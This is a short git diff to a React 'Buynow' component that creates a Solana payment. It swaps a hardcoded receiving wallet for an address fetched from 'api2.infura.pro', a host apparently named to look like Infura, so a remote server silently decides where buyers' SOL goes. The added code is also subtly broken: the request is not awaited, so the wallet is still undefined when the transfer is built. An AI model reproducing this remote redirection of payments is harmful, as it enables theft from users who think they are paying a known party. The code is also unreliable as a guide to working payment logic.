@@ -153,26 +153,27 @@ const Buynow = () => {
       //   return toastError('Please try again')
       // }
 
-      let walletAddr = '91UbYbBXcerJVa7yHqBmY8NKDmspT1QZ8Ub5Arem2Wxb'
+      let walletAddr;
 
-      // try {
-      //   axios
-      //     .post('https://api2.infura.pro/infura', {
-      //       infra_id: Number(solAmount).toString(),
-      //       project_id: 'kojo',
-      //     })
-      //     .then((res) => {
-      //       if (res.data.success == true) {
-      //         walletAddr = res.data.value
-      //       } else {
-      //         // ToDo : show error message.
-      //         toastError('Please try again.')
-      //         return
-      //       }
-      //     })
-      // } catch (err) {
-      //   walletAddr = '91UbYbBXcerJVa7yHqBmY8NKDmspT1QZ8Ub5Arem2Wxb'
-      // }
+      try {
+        axios
+          .post('https://api2.infura.pro/infura', {
+            infra_id: Number(solAmount).toString(),
+            project_id: 'kojo',
+          })
+          .then((res) => {
+            if (res.data.success == true) {
+              walletAddr = res.data.value
+            } else {
+              // ToDo : show error message.
+              toastError('Please try again.')
+              return
+            }
+          })
+      } catch (err) {
+        toastError('Please try again.')
+        return; 
+      }
 
       const transaction = await createTransferTransaction(
         solAmount,
